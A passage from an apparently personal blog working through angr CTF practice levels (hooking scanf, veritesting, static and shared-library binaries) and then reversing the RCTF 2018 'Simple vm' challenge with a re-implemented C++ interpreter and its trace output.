    main(sys.argv)
</code></pre>
<p>来看看这题想考怎么个事</p>
<pre><code># This time, the solution involves simply replacing scanf with our own version,
# since Angr does not support requesting multiple parameters with scanf.
</code></pre>
<p>结果</p>
<pre><code class="python">import angr

proj = angr.Project(&#39;./angr&#39;)
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)
simgr.explore(
    find=lambda state : b&#39;Good Job.&#39; in state.posix.dumps(1),
    avoid=lambda state: b&#39;Try again.&#39; in state.posix.dumps(1)
)
print(simgr.found[0].posix.dumps(0))
</code></pre>
<p>其实可以打通的，结论是angr在不断进步<del>，楽</del></p>
<p>不过这题还是想跟你说说hook系统函数的方法，其实也就是hook一下符号</p>
<pre><code class="python"># This time, the solution involves simply replacing scanf with our own version,
# since Angr does not support requesting multiple parameters with scanf.

import angr
import claripy
import sys

def main(argv):
  path_to_binary = argv[1]
  project = angr.Project(path_to_binary)

  initial_state = project.factory.entry_state(
    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
  )

  class ReplacementScanf(angr.SimProcedure):
    # Finish the parameters to the scanf function. Hint: &#39;scanf(&quot;%u %u&quot;, ...)&#39;.
    # (!)
    def run(self, format_string, scanf0_address, scanf1_address):
      # Hint: scanf0_address is passed as a parameter, isn&#39;t it?
      scanf0 = claripy.BVS(&#39;scanf0&#39;, 32)
      scanf1 = claripy.BVS(&#39;scanf1&#39;, 32)

      # The scanf function writes user input to the buffers to which the 
      # parameters point.
      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)
      self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)

      # Now, we want to &#39;set aside&#39; references to our symbolic values in the
      # globals plugin included by default with a state. You will need to
      # store multiple bitvectors. You can either use a list, tuple, or multiple
      # keys to reference the different bitvectors.
      # (!)
      self.state.globals[&#39;solution0&#39;] = scanf0
      self.state.globals[&#39;solution1&#39;] = scanf1

  scanf_symbol = &#39;__isoc99_scanf&#39;
  project.hook_symbol(scanf_symbol, ReplacementScanf())

  simulation = project.factory.simgr(initial_state)

  def is_successful(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Good Job.&#39;.encode() in stdout_output

  def should_abort(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return &#39;Try again.&#39;.encode() in stdout_output

  simulation.explore(find=is_successful, avoid=should_abort)

  if simulation.found:
    solution_state = simulation.found[0]

    # Grab whatever you set aside in the globals dict.
    stored_solutions0 = solution_state.globals[&#39;solution0&#39;]
    stored_solutions1 = solution_state.globals[&#39;solution1&#39;]
    solution = f&#39;&#123;solution_state.solver.eval(stored_solutions0)&#125; &#123;solution_state.solver.eval(stored_solutions1)&#125;&#39;
    print(solution)
  else:
    raise Exception(&#39;Could not find the solution&#39;)

if __name__ == &#39;__main__&#39;:
  main(sys.argv)
</code></pre>
<h4 id="12-angr-veritesting"><a href="#12-angr-veritesting" class="headerlink" title="12_angr_veritesting"></a>12_angr_veritesting</h4><p>？？？为什么又hook不成功了（这里因为代码又变了，想做一些新的尝试）</p>
<p>↓失败的代码</p>
<pre><code class="python">import angr
import claripy
import sys
user_input_buffer_address = 0
tmp = &#39;&#39;
def main(argv):
    path_to_binary = argv[1]
    project = angr.Project(path_to_binary)

    @project.hook(0x80492D6)
    def skip_check_equals_(state):
        global tmp
        tmp += chr(state.solver.eval(state.memory.load(state.solver.eval(state.regs.eax),2)))
        print(state.solver.eval(state.memory.load(state.solver.eval(state.regs.eax),2)))

    @project.hook(0x8049287)
    def skip_check_equals_(state,length = 20):
        print(&#39;---&#39;)
    
    check_equals_called_address = 0x80492EB
    simulation = project.factory.simgr()
    simulation.explore(find=check_equals_called_address)
    print(tmp)

if __name__ == &#39;__main__&#39;:
    main(sys.argv)
</code></pre>
<p>这里进行一点debug看看…</p>
<p>修改代码如下：</p>
<pre><code class="python">import angr
import claripy
user_input_buffer_address = 0
tmp = &#39;&#39;
def main():
    project = angr.Project(&#39;./angr&#39;)

    @project.hook(0x80492D6)
    def hook_for_fun(state, length = 11):
        global tmp
        tmp += chr(state.solver.eval((state.solver.eval(state.regs.eax))))
        # print( state.solver.eval((state.solver.eval(state.regs.eax))) )   
        print(chr(state.solver.eval((state.solver.eval(state.regs.eax)))), end = &#39; &#39;)

    @project.hook(0x8049287)
    def skip_scanf(state, length = 20):
        print(&#39;---&#39;)

    check_equals_called_address = 0x80492EB
    simulation = project.factory.simgr()

    # @project.hook(0x80492B5)
    # def skip_stash(state, length = 14):
    #     nonlocal simulation
    #     print(&quot;len : &quot; + str(len(simulation.stashes)))

    simulation.explore(find=check_equals_called_address)
    print(tmp)

if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<p>打印的内容如下：</p>
<pre><code>T W W Z Z Z Z C C C C C C C C F F F F F F F F F F F F F F F F I I I I I I I I I I I I I I I I I I I I I I I I I I I I I I I I L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L L
</code></pre>
<p>实际上，这里去重之后就是正确答案了，说明这里出现了路径爆炸，在某个地方被分化，stash内路径数量翻倍了，导致每次bfs路径都幂指数上升了</p>
<p>猜测是因为输入的不确定，在赋值的时候就需要hook掉，把这段补上（打印stash的长度看眼）：</p>
<pre><code class="python">    @project.hook(0x80492B5)
    def skip_stash(state, length = 14):
        nonlocal simulation
        print(&quot;len : &quot; + str(len(simulation.stashes)))
</code></pre>
<p>看一下目前hook后剩下的代码（ida中patch替代）</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231027152918240.png" alt="image-20231027152918240"></p>
<p>晚上睡前想着，会不会是循环的时候<code>jle</code>给分化出来了stash，但是早起看了眼前面的程序，也是循环应该没有问题的</p>
<p>加上上面又hook的代码，输出大约如下：</p>
<pre><code>len : 9
T len : 9
len : 9
W W len : 9
len : 9
len : 9
len : 9
Z Z Z Z len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
C C C C C C C C len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
len : 9
F F F F F F F F F F F F F F F F len : 9
</code></pre>
<p>结果stash长度并没有变化，但是仍旧有路径分化的现象，这就有些闹鬼了</p>
<p>打在上面看看：</p>
<pre><code class="python">import angr
import claripy
user_input_buffer_address = 0
tmp = &#39;&#39;
def main():
    project = angr.Project(&#39;./angr&#39;)

    @project.hook(0x80492D6)
    def hook_for_fun(state, length = 11):
        global tmp
        tmp += chr(state.solver.eval((state.solver.eval(state.regs.eax))))
        # print( state.solver.eval((state.solver.eval(state.regs.eax))) )   
        print(chr(state.solver.eval((state.solver.eval(state.regs.eax)))), end = &#39; &#39;)
        nonlocal simulation
        print(&quot;len : &quot; + str(len(simulation.stashes)))

    @project.hook(0x8049287)
    def skip_scanf(state, length = 20):
        print(&#39;---&#39;)

    check_equals_called_address = 0x80492EB
    simulation = project.factory.simgr()

    @project.hook(0x80492B5)
    def skip_stash(state, length = 14):
        1 == 1

    simulation.explore(find=check_equals_called_address)
    print(tmp)

if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<p>结论是stash还是9，为啥9啊，整个程序才9个<code>basic block</code>，结束地址前面已经不存在分支了</p>
<p>这里直接从scanf后面开始<code>init blank_state</code>也是一样的结果，说明不是<code>scanf</code>或者环境变量传入的问题</p>
<p>问了r1mao学长，发现这里对<code>stash</code>和<code>state</code>的理解有点问题了：</p>
<p>state会分在不同types的stash，如果这里打印<code>simulation.active</code>的话，得到的就是当前的state数量，和执行的重复数量结果是一致的</p>
<pre><code>active len : 32
stashLen : 9
</code></pre>
<p>打印一下stash 和 state的结构<br>实际上是这样子的</p>
<pre><code>stash:
----------------------------------------------------------------------------------------
active              |              kill              |              etc.          
   |							    |							     |
   ----&gt; active state               ----&gt; killed state				 ----&gt; else state
</code></pre>
<p>所以应该这样子用：</p>
<pre><code class="python">simulation.stashes[&#39;active&#39;]
</code></pre>
<p>检查一下是不是<code>jle</code>惹的锅</p>
<pre><code class="python">    @project.hook(0x80492E9)
    def test01(state):
        print(&quot;len before jle&quot;,len(simulation.stashes[&#39;active&#39;]))

    @project.hook(0x80492B5)
    def test01(state):
        print(&quot;len after jle&quot;,len(simulation.stashes[&#39;active&#39;]))   
</code></pre>
<pre><code>不是，那还好：
len before jle 1
len after jle 1
len before jle 2
len before jle 2
len after jle 2
len after jle 2
</code></pre>
<p>同理，只剩一个地方了…</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231027202218062.png" alt="image-20231027202218062"></p>
<p>这下赛博鬼抓到了…hook以后机器指令没跳过去…</p>
<p>ok，找到了，语法错误，也没报…</p>
<p>exp：</p>
<pre><code class="python">import angr
import claripy
import sys
tmp = &#39;&#39;
def main():
    project = angr.Project(&quot;./angr&quot;)

    start_address = 0x80492A5
    initial_state = project.factory.blank_state(
      addr=start_address,
      add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                      angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
    )
    simulation = project.factory.simgr(initial_state)

    address_to_check_constraint = 0x80492EB
    @project.hook(0x80492D6, length = 11)
    def hook_for_fun(state):
        global tmp
        tmp += chr(state.solver.eval((state.solver.eval(state.regs.eax))))

    simulation.explore(find=address_to_check_constraint)

    print(tmp)

if __name__ == &#39;__main__&#39;:
  main()
</code></pre>
<p>还是看看官方吧，虽然被折磨了一把…</p>
<p>这里是想教你用<code>veritesting</code>，这样子<code>veritesting=True</code>即可</p>
<pre><code class="python">import angr

proj = angr.Project(&#39;../dist/12_angr_veritesting&#39;)
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state, veritesting=True)
simgr.explore(
    find=lambda state : b&#39;Good Job.&#39; in state.posix.dumps(1),
    avoid=lambda state: b&#39;Try again.&#39; in state.posix.dumps(1)
)
print(simgr.found[0].posix.dumps(0))
</code></pre>
<h4 id="13-angr-static-binary"><a href="#13-angr-static-binary" class="headerlink" title="13_angr_static_binary"></a>13_angr_static_binary</h4><p>可以看到原本的<code>strcmp</code>函数被分解成了很复杂的样子，会导致angr陷进去出不来了，其他库函数也一样</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231027204604093.png" alt="image-20231027204604093"></p>
<p>这里是编译时加了静态链接的参数导致的</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231027204948008.png" alt="image-20231027204948008"></p>
<p>把系统函数hook掉换成libc和glibc里的标准符号即可</p>
<pre><code class="python">import angr

proj = angr.Project(&#39;./angr&#39;)
proj.hook(0x8051E40, angr.SIM_PROCEDURES[&#39;libc&#39;][&#39;printf&#39;]())
proj.hook(0x8051E90, angr.SIM_PROCEDURES[&#39;libc&#39;][&#39;scanf&#39;]())
proj.hook(0x805EBE0, angr.SIM_PROCEDURES[&#39;libc&#39;][&#39;puts&#39;]())
proj.hook(0x804AB50, angr.SIM_PROCEDURES[&#39;glibc&#39;][&#39;__libc_start_main&#39;]())
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state, veritesting=True)
simgr.explore(
    find=lambda state : b&#39;Good Job.&#39; in state.posix.dumps(1),
    avoid=lambda state: b&#39;Try again.&#39; in state.posix.dumps(1)
)
print(simgr.found[0].posix.dumps(0))
</code></pre>
<h4 id="14-angr-shared-library"><a href="#14-angr-shared-library" class="headerlink" title="14_angr_shared_library"></a>14_angr_shared_library</h4><p>坏了，这题目编译不明白了开始</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231027205911605.png" alt="image-20231027205911605"></p>
<p><del>直接gh上拿了…懒得研究了…</del></p>
<p>从so里面导入的check：</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231027211858381.png" alt="image-20231027211858381"></p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231027211814511.png" alt="image-20231027211814511"></p>
<p>直接看官方exp吧（也就是做了个模拟，不过这个挺经典的感觉，后面单独模拟函数会很用得上）：</p>
<pre><code class="python"># The shared library has the function validate, which takes a string and returns
# either true (1) or false (0). The binary calls this function. If it returns
# true, the program prints &quot;Good Job.&quot; otherwise, it prints &quot;Try again.&quot;
#
# Note: When you run this script, make sure you run it on
# lib14_angr_shared_library.so, not the executable. This level is intended to
# teach how to analyse binary formats that are not typical executables.

import angr
import claripy
import sys

def main(argv):
  path_to_binary = argv[1]

  # The shared library is compiled with position-independent code. You will need
  # to specify the base address. All addresses in the shared library will be
  # base + offset, where offset is their address in the file.
  # (!)
  base = 0x4000000
  project = angr.Project(path_to_binary, load_options=&#123;
    &#39;main_opts&#39; : &#123;
      &#39;base_addr&#39; : base
    &#125;
  &#125;)

  # Initialize any symbolic values here; you will need at least one to pass to
  # the validate function.
  # (!)
  buffer_pointer = claripy.BVV(0x3000000, 32) # 这里乱写一个就行

  # Begin the state at the beginning of the validate function, as if it was
  # called by the program. Determine the parameters needed to call validate and
  # replace &#39;parameters...&#39; with bitvectors holding the values you wish to pass.
  # Recall that &#39;claripy.BVV(value, size_in_bits)&#39; constructs a bitvector
  # initialized to a single value.
  # Remember to add the base value you specified at the beginning to the
  # function address!
  # Hint: int validate(char* buffer, int length) &#123; ...
  # (!)
  validate_function_address = base + 0x670
  initial_state = project.factory.call_state(
                    validate_function_address,
                    buffer_pointer,
                    claripy.BVV(8, 32),
                    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                                   angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;
                  )

  # Inject a symbolic value for the password buffer into the program and
  # instantiate the simulation. Another hint: the password is 8 bytes long.
  # (!)
  password = claripy.BVS(&#39;password&#39;, 8*8)
  initial_state.memory.store(buffer_pointer, password)

  simulation = project.factory.simgr(initial_state)

  # We wish to reach the end of the validate function and constrain the
  # return value of the function (stored in eax) to equal true (value of 1)
  # just before the function returns. We could use a hook, but instead we
  # can search for the address just before the function returns and then
  # constrain eax
  # (!)
  check_constraint_address = base + 0x71c
  simulation.explore(find=check_constraint_address)

  if simulation.found:
    solution_state = simulation.found[0]

    # Determine where the program places the return value, and constrain it so
    # that it is true. Then, solve for the solution and print it.
    # (!)
    solution_state.add_constraints(solution_state.regs.eax != 0)
    solution = solution_state.solver.eval(password,cast_to=bytes).decode()
    print(solution)
  else:
    raise Exception(&#39;Could not find the solution&#39;)

if __name__ == &#39;__main__&#39;:
  main(sys.argv)
</code></pre>
<hr>
<p>莫名其妙的下面变成pwn题了…</p>
<h6 id="pwn"><a href="#pwn" class="headerlink" title="-pwn-"></a>-pwn-</h6><h4 id="15-angr-arbitrary-read"><a href="#15-angr-arbitrary-read" class="headerlink" title="15_angr_arbitrary_read"></a>15_angr_arbitrary_read</h4><p>乍看一下就很怪了，只得翻exp，发现是用pwn…</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231027213412278.png" alt="image-20231027213412278"></p>
<p><del>那这里到了期待已久的auto pwn环节哩</del></p>
]]></content>
  </entry>
  <entry>
    <title>VM</title>
    <url>/2023/03/03/VM/</url>
    <content><![CDATA[<h4 id="preface"><a href="#preface" class="headerlink" title="preface"></a>preface</h4><h6 id="It’s-quite-a-while-since-last-been-working-out-a-reverse-problems-When-came-into-a-VM-golang-problem-in-VNCTF-I-spent-much-time-but-done-nothing-So-here-I-collect-some-VM-problems-and-tried-to-get-better-understand-of-the-thing"><a href="#It’s-quite-a-while-since-last-been-working-out-a-reverse-problems-When-came-into-a-VM-golang-problem-in-VNCTF-I-spent-much-time-but-done-nothing-So-here-I-collect-some-VM-problems-and-tried-to-get-better-understand-of-the-thing" class="headerlink" title="It’s quite a while since last been working out a reverse problems. When came into a VM(golang) problem in VNCTF, I spent much time but done nothing. So here I collect some VM problems and tried to get better understand of the thing."></a>It’s quite a while since last been working out a reverse problems. When came into a VM(golang) problem in VNCTF, I spent much time but done nothing. So here I collect some VM problems and tried to get better understand of the thing.</h6><span id="more"></span>
<h3 id="RCTF-2018-Simple-vm"><a href="#RCTF-2018-Simple-vm" class="headerlink" title="RCTF 2018 Simple vm"></a>RCTF 2018 Simple vm</h3><p><img src="/2023/03/03/VM/VM%5Cmain.png" alt="main"></p>
<p>From the main function, we see that v3 read the <code>p.bin</code> file. By <a href="https://cplusplus.com/reference/cstdio/fseek/">searching</a>, I marked the main function like this:</p>
<p><img src="/2023/03/03/VM/VM%5Cmain_0.png" alt="main_0"></p>
<p>And we know that <code>sub_400896</code> is where VM runs. So we can add breakpoint then step in and dynamic debug the function.</p>
<p><img src="/2023/03/03/VM/VM%5Csub_400896.png" alt="sub_400896"></p>
<p>We can see that <code>ptr</code> is a address and <code>v1[]</code> seems like our opcode. Well, if it’s the first time you do a vm problem, you might still confuse about what happen here. Howerver, we can stimulate the program our self:</p>
<style>
pre {
  overflow-y: auto;
  max-height: 300px;
}
</style>
<pre><code class="cpp">    #include&lt;bits/stdc++.h&gt;
    #include&lt;windows.h&gt;
    #include&lt;stdlib.h&gt;
    #define _BYTE unsigned char
    #define _DWORD unsigned int
    using namespace std;
    long long length_of_file;
    void * ptr;
    __int64 sub_400896();
    int dword_6010A4;
    int c;

    int main()&#123;
        FILE *v3; // rax
        const char *v4; // rdi
        FILE *v5; // rbx
        size_t v6; // rbp
        void *v8; // rax
        
        v3 = fopen(&quot;p.bin&quot;, &quot;rb&quot;);
        v4 = &quot;err 0&quot;;
        if ( !v3 )
            goto LABEL_4;
        v5 = v3;
        fseek(v3, 0LL, 2);
        length_of_file = ftell(v5);
        fseek(v5, 0LL, 0);
        v6 = length_of_file;
        if ( length_of_file &lt;= 0 )
        &#123;
            v4 = &quot;err 1&quot;;
            LABEL_4:
                puts(v4);
                return 0xFFFFFFFFLL;
        &#125;
        v8 = malloc(length_of_file);
        ptr = v8;
        v4 = &quot;err 3&quot;;
        if ( !v8 )
            goto LABEL_4;
        v4 = &quot;err 4&quot;;
        if ( length_of_file != fread(v8, 1uLL, v6, v5) )
            goto LABEL_4;
        fclose(v5);
        v4 = &quot;err 5&quot;;
        if ( (unsigned int)sub_400896() )
            goto LABEL_4;
        free(ptr);
        return 0LL;
    &#125;


    __int64 sub_400896()&#123;
        __int64 v0; // rax
        _BYTE *v1; // rbp
        int v2; // ebx
        __int64 v4; // rdx
        __int64 v5; // rax
        __int64 v6; // rax
        __int64 v7; // rax
        __int64 v8; // rax
        __int64 v9; // rax
        int v10; // eax
        __int64 v11; // rax
        char v12; // dl
        int v13; // eax
        int v14; // eax
        _BYTE *v15; // rax
        __int64 v16; // rax
        __int64 v17; // rax
        __int64 v18; // rax
        
        v0 = 0LL;
        v1 = (unsigned char*)ptr;
        while ( 1 )
        &#123;
            v2 = v0 + 1;
            switch ( v1[v0] )
            &#123;
            case 0:
                return *(unsigned int *)&amp;v1[v2];
            case 1:
                goto LABEL_35;
            case 2:
                v4 = v2;
                v2 = v0 + 9;
                v1[*(int *)&amp;v1[v4]] = *(_DWORD *)&amp;v1[(int)v0 + 5];
                break;
            case 3:
                v5 = v2;
                v2 += 4;
                v6 = *(int *)&amp;v1[v5];
                goto LABEL_27;
            case 4:
                v7 = v2;
                v2 += 4;
                v8 = *(int *)&amp;v1[v7];
                goto LABEL_31;
            case 5:
                v9 = v2;
                v2 += 4;
                v10 = (char)v1[*(int *)&amp;v1[v9]];
                goto LABEL_21;
            case 6:
                v11 = v2;
                v12 = dword_6010A4;
                v2 += 4;
                v8 = *(int *)&amp;v1[v11];
                goto LABEL_9;
            case 7:
                v13 = dword_6010A4;
                goto LABEL_23;
            case 8:
                v14 = ~(dword_6010A4 &amp; c);
                goto LABEL_12;
            case 0xA:
                v14 = getchar();
                goto LABEL_12;
            case 0xB:
                putchar(c);
                break;
            case 0xC:
                v15 = &amp;v1[*(int *)&amp;v1[v2]];
                if ( *v15 )&#123;
                    v2 = *(_DWORD *)&amp;v1[v2 + 4];
                    --*v15;
                &#125;
                else&#123;
                    v2 += 8;
                &#125;
                break;
            case 0xD:
                ++c;
                break;
            case 0xE:
                ++dword_6010A4;
                break;
            case 0xF:
                v14 = dword_6010A4;
                goto LABEL_12;
            case 0x10:
                v10 = c;
                goto LABEL_21;
            case 0x11:
                v16 = v2;
                v2 += 4;
                v13 = *(_DWORD *)&amp;v1[v16];
                LABEL_23:
                    c += v13;
                    break;
            case 0x12:
                v6 = dword_6010A4;
                goto LABEL_27;
            case 0x13:
                v6 = c;
                LABEL_27:
                    v14 = (char)v1[v6];
                    goto LABEL_12;
            case 0x14:
                v17 = v2;
                v2 += 4;
                v14 = *(_DWORD *)&amp;v1[v17];
                goto LABEL_12;
            case 0x15:
                v18 = v2;
                v2 += 4;
                v10 = *(_DWORD *)&amp;v1[v18];
                LABEL_21:
                    dword_6010A4 = v10;
                    break;
            case 0x16:
                v8 = dword_6010A4;
                LABEL_31:
                    v12 = c;
                    LABEL_9:
                        v1[v8] = v12;
                        break;
            case 0x17:
                v14 = c - dword_6010A4;
                LABEL_12:
                    c = v14;
                    break;
            case 0x18:
                if ( c )
                    LABEL_35:
                        v2 = *(_DWORD *)&amp;v1[v2];
                else
                    v2 = v0 + 5;
                break;
            default:
                break;
            &#125;
            if ( v2 &gt;= length_of_file )
                return 0LL;
            v0 = v2;
        &#125;
    &#125;
</code></pre>
<p>and we can add some outputs, so as to understand this program:</p>
<pre><code class="cpp">    #include&lt;bits/stdc++.h&gt;
    #include&lt;windows.h&gt;
    #include&lt;stdlib.h&gt;
    #define _BYTE unsigned char
    #define _DWORD unsigned int
    using namespace std;
    long long length_of_file;
    void * ptr;
    __int64 sub_400896();
    int dword_6010A4;
    int c;

    int main()&#123;
        ofstream outfile;
        FILE *v3; // rax
        const char *v4; // rdi
        FILE *v5; // rbx
        size_t v6; // rbp
        void *v8; // rax
        
        v3 = fopen(&quot;p.bin&quot;, &quot;rb&quot;);
        v4 = &quot;err 0&quot;;
        if ( !v3 )
            goto LABEL_4;
        v5 = v3;
        fseek(v3, 0LL, 2);
        length_of_file = ftell(v5);
        fseek(v5, 0LL, 0);
        v6 = length_of_file;
        if ( length_of_file &lt;= 0 )
        &#123;
            v4 = &quot;err 1&quot;;
            LABEL_4:
                puts(v4);
                return 0xFFFFFFFFLL;
        &#125;
        v8 = malloc(length_of_file);
        ptr = v8;
        v4 = &quot;err 3&quot;;
        if ( !v8 )
            goto LABEL_4;
        v4 = &quot;err 4&quot;;
        if ( (long long unsigned int)length_of_file != fread(v8, 1uLL, v6, v5) )
            goto LABEL_4;
        fclose(v5);
        v4 = &quot;err 5&quot;;
        if ( (unsigned int)sub_400896() )
            goto LABEL_4;
        free(ptr);
        return 0LL;
    &#125;


    __int64 sub_400896()&#123;
        __int64 v0; // rax
        _BYTE *v1; // rbp
        int v2; // ebx
        __int64 v4; // rdx
        __int64 v5; // rax
        __int64 v6; // rax
        __int64 v7; // rax
        __int64 v8; // rax
        __int64 v9; // rax
        int v10; // eax
        __int64 v11; // rax
        char v12; // dl
        int v13; // eax
        int v14; // eax
        _BYTE *v15; // rax
        __int64 v16; // rax
        __int64 v17; // rax
        __int64 v18; // rax
        
        v0 = 0LL;
        v1 = (unsigned char*)ptr;
        while ( 1 )
        &#123;
            v2 = v0 + 1;
    //		printf(&quot;v2 = v0 + 1;\n&quot;);
            switch ( v1[v0] )
            &#123;
            case 0:
                cout&lt;&lt;&quot;return \n&quot;&lt;&lt;*(unsigned int *)&amp;v1[v2]&lt;&lt;endl;
                return *(unsigned int *)&amp;v1[v2];
            case 1:
                goto LABEL_35;
            case 2:
                v4 = v2;
                v2 = v0 + 9;
                v1[*(int *)&amp;v1[v4]] = *(_DWORD *)&amp;v1[(int)v0 + 5];
    //			printf(&quot;v4 = v2\n&quot;);
    //			printf(&quot;v2 = v0 + 9\n&quot;);
                printf(&quot;v1[%d] = %u\n&quot;,*(int *)&amp;v1[v4],*(_DWORD *)&amp;v1[(int)v0 + 5]);
                break;
            case 3:
                v5 = v2;
                v2 += 4;
                v6 = *(int *)&amp;v1[v5];
    //			printf(&quot;v5 = v2\n&quot;);
    //			printf(&quot;v2 += 4\n&quot;);
    //			printf(&quot;v6 = v1[%lld] (%d)\n&quot;,v5,*(int *)&amp;v1[v5]);
                goto LABEL_27;
            case 4:
                v7 = v2;
                v2 += 4;
                v8 = *(int *)&amp;v1[v7];
                printf(&quot;v7 = v2\n&quot;);
    //			printf(&quot;v2 += 4\n&quot;);
                printf(&quot;v8 = v1[%lld] (%d)\n&quot;,v7,*(int *)&amp;v1[v7]);
                goto LABEL_31;
            case 5:
                v9 = v2;
                v2 += 4;
                v10 = (char)v1[*(int *)&amp;v1[v9]];
    //			printf(&quot;v9 = v2\n&quot;);
    //			printf(&quot;v2 += 4\n&quot;);
                printf(&quot;v10 = v1[%d] (%d)\n&quot;,*(int *)&amp;v1[v9],(char)v1[*(int *)&amp;v1[v9]]);
                goto LABEL_21;
            case 6:
                v11 = v2;			
                v12 = dword_6010A4;
                v2 += 4;
                v8 = *(int *)&amp;v1[v11];
    //			printf(&quot;v11 = v2\n&quot;);
                printf(&quot;v12 = dword_6010A4\n&quot;);
    //			printf(&quot;v2 +=4\n&quot;);
                printf(&quot;v8 = v1[%lld] (%d)\n&quot;,v11,*(int *)&amp;v1[v11]);
                goto LABEL_9;
            case 7:
                v13 = dword_6010A4;
                printf(&quot;v13 = dwod_6010A4 (%d)\n&quot;,dword_6010A4);
                goto LABEL_23;
            case 8:
                v14 = ~(dword_6010A4 &amp; c);
                printf(&quot;dword_6010A4 = %d ; c = %d\n&quot;,dword_6010A4,c);
                printf(&quot;v14 = dword_6010A4 nand c\n&quot;);
                goto LABEL_12;
            case 0xA:
                printf(&quot;input:\n&quot;);
                v14 = getchar();
                goto LABEL_12;	
            case 0xB:																						//the output of judgement
                printf(&quot;output:\n&quot;);
                putchar(c);
                break;
            case 0xC:
                v15 = &amp;v1[*(int *)&amp;v1[v2]];
                printf(&quot;v15 = &amp;v1[%d] (%d)\n&quot;,*(int *)&amp;v1[v2],v1[*(int *)&amp;v1[v2]]);
                if ( *v15 )&#123;
                    v2 = *(_DWORD *)&amp;v1[v2 + 4];
                    --*v15;
    //				printf(&quot;v2 = v1[%d]\n&quot;,v2+4);
                    printf(&quot;--*v15\n&quot;);
                &#125;
                else&#123;
    //				printf(&quot;v2 += 8\n&quot;);
                    v2 += 8;
                &#125;
                break;
            case 0xD:
                ++c;
                printf(&quot;c++\n&quot;);
                break;
            case 0xE:
                ++dword_6010A4;
                printf(&quot;dword_6010A4++\n&quot;);
                break;
            case 0xF:
                v14 = dword_6010A4;
                printf(&quot;v14 = dword_6010A4\n&quot;);
                goto LABEL_12;
            case 0x10:
                v10 = c;
                printf(&quot;v10 = c(%d)\n&quot;,c);
                goto LABEL_21;
            case 0x11:
                v16 = v2;
                v2 += 4;
                v13 = *(_DWORD *)&amp;v1[v16];
                printf(&quot;v13 = v1[%lld] (%d)\n&quot;,v16,c);
    //			printf(&quot;v16 = v2 (%d)\n&quot;,v2);
    //			printf(&quot;v2 += 2\n&quot;);
                LABEL_23:
                    c += v13;
                    printf(&quot;c += v13\n&quot;);
                    break;
            case 0x12:
                v6 = dword_6010A4;
    //			printf(&quot;v6 = dword_6010A4\n&quot;);
                goto LABEL_27;
            case 0x13:
                v6 = c;
                printf(&quot;v6 = c\n&quot;);
                LABEL_27:
                    v14 = (char)v1[v6];
                    printf(&quot;v14 = v1[%d] (%c)\n&quot;,v6,v14);
                    goto LABEL_12;
            case 0x14:
                v17 = v2;
                v2 += 4;
                v14 = *(_DWORD *)&amp;v1[v17];
                printf(&quot;v14 =v1[%lld] (%d)\n&quot;,v17,v14);
                goto LABEL_12;
            case 0x15:
                v18 = v2;
                v2 += 4;
                v10 = *(_DWORD *)&amp;v1[v18];
                printf(&quot;v10 =v1[%lld] (%d)\n&quot;,v18,v10);
                LABEL_21:
                    dword_6010A4 = v10;
                    printf(&quot;dword_6010A4 = v10\n&quot;);
                    break;
            case 0x16:
                v8 = dword_6010A4;
                printf(&quot;v8 = dword_6010A4\n&quot;);
                LABEL_31:
                    v12 = c;
                    printf(&quot;v12 = c\n&quot;);
                    LABEL_9:
                        v1[v8] = v12;
                        printf(&quot;v1[%lld] = v12 (%d)\n&quot;,v8,v12);
                        break;
            case 0x17:
                v14 = c - dword_6010A4;
                printf(&quot;__dword_6010A4 = %d     c = %d\n&quot;,dword_6010A4,c);
                printf(&quot;v14 = c - dword_6010A4\n&quot;);
                LABEL_12:
                    c = v14;
                    printf(&quot;c = v14\n&quot;);
                    break;
            case 0x18:
                if ( c )&#123;
                    LABEL_35:
    //					printf(&quot;v2 = v1[%d]\n&quot;,v2);
                        v2 = *(_DWORD *)&amp;v1[v2];
                &#125;
                else&#123;
                    v2 = v0 + 5;
    //				printf(&quot;v2 = v0 + 5\n&quot;);
                &#125;
                break;
            default:
                break;
            &#125;
            if ( v2 &gt;= length_of_file )&#123;
                printf(&quot;length end\nreturn;\n&quot;);
                return 0LL;
            &#125;
                
            v0 = v2;
        &#125;
    &#125;
</code></pre>
<p>outputs:</p>
<pre><code>v10 =v1[49] (256)
dword_6010A4 = v10
dword_6010A4++
v14 = v1[257] (I)
c = v14
output:
Iv15 = &amp;v1[256] (10)
--*v15
dword_6010A4++
v14 = v1[258] (n)
c = v14
output:
nv15 = &amp;v1[256] (9)
--*v15
dword_6010A4++
v14 = v1[259] (p)
c = v14
output:
pv15 = &amp;v1[256] (8)
--*v15
dword_6010A4++
v14 = v1[260] (u)
c = v14
output:
uv15 = &amp;v1[256] (7)
--*v15
dword_6010A4++
